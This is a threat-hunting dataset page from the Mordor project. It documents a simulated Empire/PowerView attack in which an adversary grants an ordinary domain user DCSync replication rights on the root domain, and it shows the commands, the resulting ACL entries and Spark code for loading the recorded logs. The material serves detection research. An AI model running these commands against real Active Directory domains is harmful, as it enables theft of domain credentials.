# Empire DCSync ACL

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190301125905 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/03/01 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/empire_dcsync_acl.tar.gz |

## Dataset Description
This dataset represents adversaries with enough permissions (domain admin) adding an ACL to the Root Domain for any user, despite being in no privileged groups, having no malicious sidHistory, and not having local admin rights on the domain controller itself.

## Adversary View
```
scriptimport data/module_source/situational_awareness/network/powerview.ps1
scriptcmd Add-DomainObjectAcl -TargetIdentity "dc=shire,dc=com" -TargetDomain shire.com -PrincipalIdentity nmartha -Rights DCSync

You can verify that it worked by running the following commands:

scriptcmd $nmarthaSid = Get-DomainUser nmartha | Select-Object -ExpandProperty objectsid; Get-DomainObjectACL  "dc=shire,dc=com" -Domain shire.com -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $nmarthaSid}

AceQualifier           : AccessAllowed
ObjectDN               : DC=shire,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-2511471446-1103646877-3980648787
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2511471446-1103646877-3980648787-1106
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=shire,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-2511471446-1103646877-3980648787
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2511471446-1103646877-3980648787-1106
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=shire,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-2511471446-1103646877-3980648787
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2511471446-1103646877-3980648787-1106
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/empire_dcsync_acl.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        